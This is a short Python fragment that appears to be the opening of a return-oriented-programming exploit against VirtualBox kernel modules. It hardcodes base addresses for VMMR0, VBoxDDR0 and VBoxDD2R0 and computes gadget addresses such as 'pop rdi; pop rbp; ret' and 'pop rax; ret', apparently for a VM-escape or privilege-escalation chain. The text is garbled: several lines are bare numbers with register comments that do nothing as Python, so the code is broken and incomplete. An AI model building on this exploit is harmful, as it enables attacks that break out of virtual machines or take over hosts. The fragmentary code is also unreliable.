#!/usr/bin/python3

VMMR0 = 0xffffffffa0cdc020
VboxDDR0 = 0xffffffffa07a5020
VboxDD2R0 = 0xffffffffa0066020

0 # rdi
0 # rbp
poppopret = VboxDDR0 + 0xdba # pop rdi# pop rbp# ret
0x69 # rdx
popret = VMMR0 + 0x1f7bd # pop rax# ret
